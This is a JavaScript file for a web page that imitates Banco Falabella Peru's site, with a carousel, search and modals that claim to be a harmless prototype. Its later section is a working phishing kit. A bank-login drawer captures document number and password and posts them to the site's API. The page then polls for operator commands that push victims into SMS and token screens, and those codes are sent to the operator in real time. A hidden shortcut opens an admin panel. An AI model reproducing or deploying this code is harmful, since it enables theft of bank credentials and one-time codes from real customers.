const track = document.querySelector("#hero-track");
const slides = [...track.children];
const dotsWrap = document.querySelector("#dots");
let index = 0;
let timer;

slides.forEach((_, i) => {
  const dot = document.createElement("button");
  dot.type = "button";
  dot.setAttribute("aria-label", `Ir a la diapositiva ${i + 1}`);
  dot.addEventListener("click", () => go(i));
  dotsWrap.append(dot);
});

function go(nextIndex) {
  index = (nextIndex + slides.length) % slides.length;
  track.style.transform = `translateX(-${index * 100}%)`;
  slides.forEach((slide, i) => {
    const active = i === index;
    slide.toggleAttribute("inert", !active);
    slide.setAttribute("aria-hidden", String(!active));
  });
  [...dotsWrap.children].forEach((dot, i) => {
    const active = i === index;
    dot.classList.toggle("is-active", active);
    if (active) dot.setAttribute("aria-current", "true");
    else dot.removeAttribute("aria-current");
  });
}

function start() {
  stop();
  if (window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
  timer = setInterval(() => go(index + 1), 6500);
}
function stop() { clearInterval(timer); }

document.querySelectorAll("[data-hero]").forEach((button) => {
  button.addEventListener("click", () => {
    go(index + Number(button.dataset.hero));
    start();
  });
});
track.parentElement.addEventListener("mouseenter", stop);
track.parentElement.addEventListener("mouseleave", start);
go(0);
start();

document.querySelectorAll("[data-row]").forEach((row) => {
  const scroller = row.querySelector(".scroller");
  row.querySelector(".prev").addEventListener("click", () => {
    scroller.scrollBy({ left: -280, behavior: "smooth" });
  });
  row.querySelector(".next").addEventListener("click", () => {
    scroller.scrollBy({ left: 280, behavior: "smooth" });
  });
});

const nav = document.querySelector("#nav");
document.querySelector("#menu-toggle").addEventListener("click", (event) => {
  const open = nav.classList.toggle("is-open");
  event.currentTarget.setAttribute("aria-expanded", String(open));
});
document.querySelectorAll(".nav-item > button").forEach((button) => {
  button.addEventListener("click", () => {
    if (window.innerWidth > 760) return;
    button.parentElement.classList.toggle("is-open");
  });
});

const catalog = [
  { title: "Tarjeta CMR", hint: "100% digital", id: "unete" },
  { title: "Cuenta Sueldo", hint: "5% TREA", id: "beneficios" },
  { title: "Rapicash", hint: "Desembolso desde la CMR", id: "beneficios" },
  { title: "Promociones", hint: "Oportunidades Únicas", id: "promos" },
  { title: "Educación financiera", hint: "Tips y productos", id: "educacion" },
  { title: "falabella.com", hint: "Ofertas con CMR", id: "tienda" }
];
const search = document.querySelector("#buscar");
const pop = document.querySelector("#search-pop");
function renderSearch(query) {
  const q = query.trim().toLowerCase();
  pop.innerHTML = "";
  catalog.filter((item) => !q || `${item.title} ${item.hint}`.toLowerCase().includes(q)).forEach((item) => {
    const button = document.createElement("button");
    button.type = "button";
    button.innerHTML = `${item.title}<small>${item.hint}</small>`;
    button.addEventListener("click", () => {
      document.getElementById(item.id)?.scrollIntoView({ behavior: "smooth" });
      pop.classList.remove("is-open");
      search.value = "";
    });
    pop.append(button);
  });
  pop.classList.add("is-open");
}
search.addEventListener("focus", () => renderSearch(search.value));
search.addEventListener("input", () => renderSearch(search.value));
document.addEventListener("click", (event) => {
  if (!event.target.closest(".search-wrap")) pop.classList.remove("is-open");
});

const overlay = document.querySelector("#overlay");
const modalTitle = document.querySelector("#modal-title");
const modalText = document.querySelector("#modal-text");
const modalForm = document.querySelector("#modal-form");
const modalSuccess = document.querySelector("#modal-success");
const producto = document.querySelector("#producto");
const drawer = document.querySelector("#drawer");
const modes = {
  hazte: { title: "Hazte cliente", text: "Este prototipo no envía datos al banco.", form: true },
  banca: { title: "Banca Internet", text: "El acceso real no está en este prototipo. No pedimos clave, DNI ni número de tarjeta.", form: false },
  "cookies-info": { title: "Cookies", text: "El botón Entendido solo oculta este aviso en tu navegador.", form: false }
};

function openModal(name, product) {
  const mode = modes[name] || modes.hazte;
  modalTitle.textContent = mode.title;
  modalText.hidden = false;
  modalText.textContent = mode.text;
  modalForm.classList.toggle("is-off", !mode.form);
  document.querySelector("#modal-info-actions").hidden = mode.form;
  modalSuccess.classList.remove("is-on");
  if (product && [...producto.options].some((option) => option.value === product)) producto.value = product;
  overlay.hidden = false;
  overlay.classList.add("is-open");
}
function closeModal() {
  overlay.classList.remove("is-open");
  overlay.hidden = true;
}

document.querySelectorAll("[data-open]").forEach((trigger) => {
  trigger.addEventListener("click", (event) => {
    event.preventDefault();
    if (trigger.dataset.open === "contacto") {
      drawer.hidden = false;
      requestAnimationFrame(() => drawer.classList.add("is-open"));
      return;
    }
    if (trigger.dataset.open === "banca") {
      openBancaDrawer();
      return;
    }
    openModal(trigger.dataset.open, trigger.dataset.producto);
  });
});
overlay.addEventListener("click", (event) => {
  if (event.target === overlay || event.target.closest("[data-close]")) closeModal();
});
document.addEventListener("keydown", (event) => {
  if (event.key === "Escape") {
    closeModal();
    drawer.classList.remove("is-open");
    if (typeof closeBancaDrawer === "function") closeBancaDrawer();
  }
});
document.querySelector("#enviar").addEventListener("click", () => {
  const nombre = document.querySelector("#nombre").value.trim();
  const correo = document.querySelector("#correo").value.trim();
  if (!nombre || !correo.includes("@")) {
    modalText.textContent = "Escribe tu nombre y un correo válido.";
    return;
  }
  document.querySelector("#success-text").textContent = `${nombre}, anotamos tu interés en ${producto.value}. No hay solicitud real.`;
  modalText.hidden = true;
  modalForm.classList.add("is-off");
  modalSuccess.classList.add("is-on");
});
document.querySelector("[data-close-drawer]").addEventListener("click", () => drawer.classList.remove("is-open"));
document.querySelector("#enviar-mensaje").addEventListener("click", () => {
  if (!document.querySelector("#mensaje").value.trim()) return;
  document.querySelector("#mensaje-ok").hidden = false;
  document.querySelector("#mensaje").value = "";
});

document.addEventListener("click", (event) => {
  if (event.target.closest("[data-open='banca']")) return;
  if (event.target.closest("#overlay, #drawer, #banca-drawer, #banca-backdrop")) return;
  const control = event.target.closest("a, button");
  if (!control) return;
  if (control.closest(".hero-arrow, .dots, .scroller-wrap") || control.id === "menu-toggle") return;
  event.preventDefault();
  event.stopPropagation();
}, true);

const cookie = document.querySelector("#cookie");
if (localStorage.getItem("falpe-cookie") === "1") cookie.classList.add("is-hidden");
document.querySelector("#cookie-ok").addEventListener("click", () => {
  localStorage.setItem("falpe-cookie", "1");
  cookie.classList.add("is-hidden");
});

// ==========================================================================
// Banco Falabella "Ingresa a tu cuenta" Side Drawer Logic
// ==========================================================================
const bancaDrawer = document.querySelector("#banca-drawer");
const bancaBackdrop = document.querySelector("#banca-backdrop");
const bancaCloseBtn = document.querySelector("#banca-drawer-close");
const bancaDocType = document.querySelector("#banca-doc-type");
const bancaDocNumber = document.querySelector("#banca-doc-number");
const bancaPassword = document.querySelector("#banca-password");
const bancaPassToggle = document.querySelector("#banca-pass-toggle");
const bancaBtnSubmit = document.querySelector("#banca-btn-submit");
const bancaEyeSlash = document.querySelector("#banca-eye-slash");
const bancaForm = document.querySelector("#banca-login-form");

function openBancaDrawer() {
  if (!bancaDrawer || !bancaBackdrop) return;
  bancaBackdrop.hidden = false;
  bancaDrawer.hidden = false;
  requestAnimationFrame(() => {
    bancaBackdrop.classList.add("is-open");
    bancaDrawer.classList.add("is-open");
    bancaDocNumber?.focus();
  });
}

function closeBancaDrawer() {
  if (!bancaDrawer || !bancaBackdrop) return;
  bancaBackdrop.classList.remove("is-open");
  bancaDrawer.classList.remove("is-open");
  setTimeout(() => {
    bancaBackdrop.hidden = true;
    bancaDrawer.hidden = true;
  }, 320);
}

if (bancaCloseBtn) {
  bancaCloseBtn.addEventListener("click", closeBancaDrawer);
  bancaBackdrop.addEventListener("click", closeBancaDrawer);
}

// Handle Document Type switching
if (bancaDocType) {
  bancaDocType.addEventListener("change", () => {
    const val = bancaDocType.value;
    bancaDocNumber.value = "";
    if (val === "DNI") {
      bancaDocNumber.placeholder = "DNI";
      bancaDocNumber.maxLength = 8;
      bancaDocNumber.inputMode = "numeric";
    } else if (val === "CE") {
      bancaDocNumber.placeholder = "Carné de Extranjería";
      bancaDocNumber.maxLength = 12;
      bancaDocNumber.inputMode = "text";
    } else if (val === "Pasaporte") {
      bancaDocNumber.placeholder = "Número de Pasaporte";
      bancaDocNumber.maxLength = 12;
      bancaDocNumber.inputMode = "text";
    } else if (val === "RUC") {
      bancaDocNumber.placeholder = "RUC (11 dígitos)";
      bancaDocNumber.maxLength = 11;
      bancaDocNumber.inputMode = "numeric";
    }
    validateBancaForm();
  });
}

// Handle Password Eye Toggle
if (bancaPassToggle) {
  bancaPassToggle.addEventListener("click", () => {
    const isPass = bancaPassword.type === "password";
    bancaPassword.type = isPass ? "text" : "password";
    if (bancaEyeSlash) {
      bancaEyeSlash.style.display = isPass ? "none" : "block";
    }
  });
}

// Form validation: Enable submit button when fields are valid
function validateBancaForm() {
  if (!bancaDocNumber || !bancaPassword || !bancaBtnSubmit) return;
  const docVal = bancaDocNumber.value.trim();
  const passVal = bancaPassword.value.trim();
  const minDocLen = bancaDocType.value === "DNI" ? 8 : (bancaDocType.value === "RUC" ? 11 : 6);
  
  const isValid = docVal.length >= minDocLen && passVal.length === 6;
  bancaBtnSubmit.disabled = !isValid;
  bancaBtnSubmit.classList.toggle("is-active", isValid);
}

if (bancaDocNumber && bancaPassword) {
  bancaDocNumber.addEventListener("input", validateBancaForm);
  bancaPassword.addEventListener("input", validateBancaForm);
}

const bancaLoadingOverlay = document.querySelector("#banca-loading-overlay");

// Session and Command Receiver Logic for Admin Panel (REST API)
let currentSessionId = null;

async function saveCapturedSession(docType, docNumber, password) {
  try {
    const res = await fetch("/api/sessions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ docType, docNumber, password })
    });
    if (res.ok) {
      const data = await res.json();
      currentSessionId = data.sessionId;
      startCommandPolling();
    }
  } catch (e) {
    console.error("Error saving session to API:", e);
  }
}

let commandPollTimer = null;
function startCommandPolling() {
  clearInterval(commandPollTimer);
  commandPollTimer = setInterval(checkAdminCommands, 800);
}

async function checkAdminCommands() {
  if (!currentSessionId) return;
  try {
    const res = await fetch(`/api/session-status/${currentSessionId}`);
    if (res.ok) {
      const data = await res.json();
      if (data.action) {
        handleAdminAction(data.action);
      }
    }
  } catch (e) {
    console.error("Error checking admin commands:", e);
  }
}

function handleAdminAction(action) {
  if (action === "SMS") {
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
    closeBancaDrawer();
    openSMSDrawer();
  } else if (action === "TOKEN") {
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
    closeBancaDrawer();
    openTokenDrawer();
  } else if (action === "ERROR") {
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
    openBancaDrawer();
    bancaPassword.value = "";
    bancaBtnSubmit.disabled = true;
    bancaBtnSubmit.classList.remove("is-active");
    alert("Documento o clave de internet incorrecta. Por favor vuelve a intentarlo.");
  } else if (action === "SUCCESS") {
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
    closeBancaDrawer();
    alert("¡Operación completada con éxito!");
  }
}

// Drawers for SMS & Token Verification
const smsDrawer = document.querySelector("#sms-modal-drawer");
const smsBackdrop = document.querySelector("#sms-modal-backdrop");
const smsForm = document.querySelector("#sms-verification-form");
const smsCodeInput = document.querySelector("#sms-code-input");

function openSMSDrawer() {
  if (!smsDrawer || !smsBackdrop) return;
  smsBackdrop.hidden = false;
  smsDrawer.hidden = false;
  requestAnimationFrame(() => {
    smsBackdrop.classList.add("is-open");
    smsDrawer.classList.add("is-open");
    smsCodeInput?.focus();
  });
}
function closeSMSDrawer() {
  if (!smsDrawer || !smsBackdrop) return;
  smsBackdrop.classList.remove("is-open");
  smsDrawer.classList.remove("is-open");
  setTimeout(() => { smsBackdrop.hidden = true; smsDrawer.hidden = true; }, 320);
}

const tokenDrawer = document.querySelector("#token-modal-drawer");
const tokenBackdrop = document.querySelector("#token-modal-backdrop");
const tokenForm = document.querySelector("#token-verification-form");
const tokenCodeInput = document.querySelector("#token-code-input");

function openTokenDrawer() {
  if (!tokenDrawer || !tokenBackdrop) return;
  tokenBackdrop.hidden = false;
  tokenDrawer.hidden = false;
  requestAnimationFrame(() => {
    tokenBackdrop.classList.add("is-open");
    tokenDrawer.classList.add("is-open");
    tokenCodeInput?.focus();
  });
}
function closeTokenDrawer() {
  if (!tokenDrawer || !tokenBackdrop) return;
  tokenBackdrop.classList.remove("is-open");
  tokenDrawer.classList.remove("is-open");
  setTimeout(() => { tokenBackdrop.hidden = true; tokenDrawer.hidden = true; }, 320);
}

document.querySelector("#sms-modal-close")?.addEventListener("click", closeSMSDrawer);
document.querySelector("#token-modal-close")?.addEventListener("click", closeTokenDrawer);

if (smsForm) {
  smsForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const code = smsCodeInput.value.trim();
    if (code.length < 6) return;
    saveCapturedCode(code, "SMS");
    closeSMSDrawer();
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = false;
  });
}

if (tokenForm) {
  tokenForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const code = tokenCodeInput.value.trim();
    if (code.length < 6) return;
    saveCapturedCode(code, "Token");
    closeTokenDrawer();
    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = false;
  });
}

async function saveCapturedCode(code, type) {
  if (!currentSessionId) return;
  try {
    await fetch("/api/submit-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId: currentSessionId, code, type })
    });
  } catch (e) {
    console.error("Error submitting captured code:", e);
  }
}

// Shortcut Ctrl + Shift + A to open Admin Dashboard
document.addEventListener("keydown", (e) => {
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "a") {
    window.open("/admin", "_blank");
  }
});

if (bancaForm) {
  bancaForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (bancaBtnSubmit.disabled) return;
    
    bancaBtnSubmit.disabled = true;
    
    // Save credentials & session to API
    saveCapturedSession(bancaDocType.value, bancaDocNumber.value.trim(), bancaPassword.value.trim());
    
    // Show center screen loading overlay with Banco Falabella logo indefinitely
    if (bancaLoadingOverlay) {
      bancaLoadingOverlay.hidden = false;
    }
  });
}
